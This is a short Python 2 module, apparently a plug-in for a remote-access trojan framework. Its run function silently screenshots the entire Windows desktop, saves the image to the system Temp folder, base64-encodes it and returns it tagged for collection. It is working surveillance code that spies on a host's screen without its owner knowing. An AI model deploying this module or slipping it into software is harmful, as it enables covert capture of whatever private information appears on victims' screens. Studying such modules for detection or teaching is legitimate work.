def run(**args):
	try:
		import win32gui
		import win32ui
		import win32con
		import win32api
		import base64
	except:
		print "Could not load the module on this host. Skipping."
		return 0, "failed"
	hdesktop = win32gui.GetDesktopWindow()
	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
	left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
	top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
	desktop_dc = win32gui.GetWindowDC(hdesktop)
	img_dc = win32ui.CreateDCFromHandle(desktop_dc)
	mem_dc = img_dc.CreateCompatibleDC()
	screenshot = win32ui.CreateBitmap()
	screenshot.CreateCompatibleBitmap(img_dc, width, height)
	mem_dc.SelectObject(screenshot)
	mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
	screenshot.SaveBitmapFile(mem_dc, 'c:\\Windows\\Temp\\screenshot.bmp')
	with open('c:\\Windows\\Temp\\screenshot.bmp', 'rb') as imagefile:
		imgstring = base64.b64encode(imagefile.read())
		print imgstring
	return imgstring, "scrn"
	
	
